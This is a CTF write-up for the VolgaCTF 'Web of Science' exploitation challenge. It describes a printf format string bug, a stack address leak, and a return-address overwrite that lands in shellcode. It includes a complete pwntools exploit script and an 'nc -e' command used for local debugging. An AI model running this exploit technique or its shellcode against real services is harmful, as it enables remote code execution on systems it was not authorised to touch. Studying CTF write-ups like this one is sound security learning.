# Volga : Web of Science

#### Author: yfb76

For this exploitation challenge, we were given a binary and the address of the service to connect to.  Connecting to the service, we first have to solve a series of captchas - in this case ~5 digit addition and subtraction.  Simple enough, I started a simple python script utilizing pwntools.  Connect to the server, grab the challenge, eval it, and respond.  Turns out there was more than one of them.  I opened up the binary in radare2, and quickly saw that we have to pass ten challenges.  Modify our script (final version below), and we are in to the service.  At the same time, I created a copy of the binary and NOP'd out the captcha challenge for local debugging.

Now that we've connected to the service, we see that it is what I call a "menu challenge" where there are several options - to add a paper etc.  Now that we have a feel for what the challenge is, I opened the binary in IDA for more intense reversing.  Working through the levels of menus, we soon find a format string exploit.  If you add a paper, and specify an abstract, and then ask for information about the paper, the abstract gets passed directly to printf().  Thus, we have a printf vulnerability.  Further, checksec reveals that the stack is executable.

TODO: insert the reversed code here

Armed with these facts, our exploit takes two steps.  1) leak a stack address, and use that to calculate the address of an input buffer we control.  2) put our exploit in the buffer, and use the printf vulnerability to return to it.

I developed the exploit locally using gdb.  Looking at the code, we see that all input (paper title, author names, abstract, etc) goes in one large buffer.  I put AAAAA as the paper name to easily identify where it was.  I set the abstract to %p (repeated many times) until I found the relative offset of the buffer from the printf - in this case 16.  I also discovered that the return address for the info function is 0x488 below the address at offset 8, and the buffer is 0x450 below it.  

The next step is to develop the actual exploit string.  In this case, I need to write 6 bytes to the return address.  Here, I will use two different strings.  I will first put the needed addresses into the name field (where we know how to access them), followed by my shellcode.  The format string in the abstract will actually overwrite the return address.  so, the name string will be of the format "[addr of first 2 bytes][address of next 2 bytes][address of last 2 bytes][shellcode]".  The abstract string will be "%[new ra1]c%16$hn%[new ra2 - new ra1]c%17$hn%[new ra3 - (previously written bytes)]c%18$hn".  This leverages printf's offset feature, and only write two bytes at a time (limiting the amount of garbage dumped to the screen).  Note that the new ra needs to be 24 bytes into the name buffer, to account for the 3 addresses that prefix it there.

I'm not so good with printf vulnerabilities, so getting this to work took some time.  My offsets were all correct, but the number of bytes to write with the %n took some time.  The correct thing to do is to take the value you want to write and then subtract the number of previously written bytes.  I was able to use 'nc -l -p 1227 -e "gdb ./mod"' to run the program locally and then connect to it with my python script.  This let me use gdb to examine what my exploit was actually doing, and eventually write the correct return address.

    import time
    import struct
    from pwn import *

    def read_gdb(r):
        string = r.recv()
        while '(gdb)' not in string:
            string = r.recv()
        r.send('r\n')
        r.recvline()

    def read_for_prompt(r):
        string = r.recv()
        tmp = string
        print tmp,
        while '>' not in tmp:
            tmp = r.recv()
            print tmp,
            string = string + tmp
        return string

    context(arch = 'amd64', os = 'linux')

    r = remote('webofscience.2016.volgactf.ru', 45678)
    #r = remote('localhost', 6666)

    #gdb nonsense
    #read_gdb(r)

    #name prompt
    print r.recvline(),
    #send our 'name'
    print 'bob'
    r.send('bob\n')

    #random sentence
    print r.recvline(),

    for x in xrange(0,10):
    #challenge
        chal = r.recvline()
        print chal,
        chal = ' '.join(chal.split(' ')[:-2])

        log.info(text.yellow("Challenge is {}".format(chal)))
        answer = str(eval(chal)) + '\n'
        log.info(text.yellow("Answer: {}".format(answer)))

    #answer prompt
        print r.recv(),
        print answer,
        r.send(answer)

    #Navigate to add paper
    read_for_prompt(r)
    print "1"
    r.send('1\n')
    read_for_prompt(r)

    #Address leak - use the abstract
    print "3"
    r.send('3\n')
    print r.recv(),
    print "%8$p"
    r.send('%8$p\n')
    read_for_prompt(r)
    print "5"
    r.send('5\n')

    ans = read_for_prompt(r).split()
    addr = ''
    for x in ans:
        if x[0] == '0' and x[1] == 'x':
            addr = x
            break
    else:
        print "Couldn't find leaked address"
        exit()
    print "Leaked: " + addr

    #construct exploit string
    ra = int(addr, 16) - 0x488
    ra2 = ra + 2
    ra3 = ra + 4

    #where is our buffer
    buf_addr = int(addr,16) - 0x450
    #skip the initial two address we wrote for the exploit
    buf_addr += 3*8
    print "Buffer at: " + str(hex(buf_addr))

    val1 = buf_addr & 0xFFFF
    val2 = ((buf_addr >> 16) & 0xFFFF) - val1
    val3 = ((buf_addr >> 32) & 0xFFFF) - (val1 + val2)

    exploit_name = "{}{}{}".format(struct.pack("<Q", ra), struct.pack("<Q", ra2), struct.pack("<Q", ra3))
    exploit_name += asm(shellcraft.sh()) + "\n"

    exploit_abstract = "%{}c%16$hn%{}c%17$hn%{}c%18$hn\n".format(val1, val2, val3)
    #exploit_abstract = "%{}c%16$hn%{}c%17$hn\n".format(val1, val2)
    #exploit_abstract = "%{}c%16$hn\n".format(val1)

    #write the exploit name and abstract
    print "1"
    r.send('1\n')
    print r.recv(),
    r.send(exploit_name)
    read_for_prompt(r)
    print "3"
    r.send('3\n')
    print r.recv(),
    r.send(exploit_abstract)
    read_for_prompt(r)

    r.interactive()
